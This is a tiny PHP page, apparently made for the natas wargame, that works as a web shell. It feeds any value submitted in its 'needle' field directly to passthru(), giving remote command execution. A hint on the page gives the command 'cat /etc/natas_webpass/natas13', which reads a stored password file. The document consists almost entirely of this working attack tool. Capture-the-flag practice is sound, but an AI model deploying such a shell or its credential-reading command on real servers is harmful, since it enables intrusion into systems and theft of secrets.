<html>
<body>
    <h1> parham's personal prompt </h1>
    <div id="content">
        <form>
            execute commands: <input name=needle><input type=submit name=submit value=Search><br>
        </form>
        <small>
            you can find natas13 with this command: cat /etc/natas_webpass/natas13
        </small>
        <br>
        Output:
        <div>
            <?
            $key = "";
            if (array_key_exists("needle", $_REQUEST)) {
                $key = $_REQUEST["needle"];
            }
            if ($key) {
                passthru($key);
            }
            ?>
        </div>
    </div>
</body>
</html>
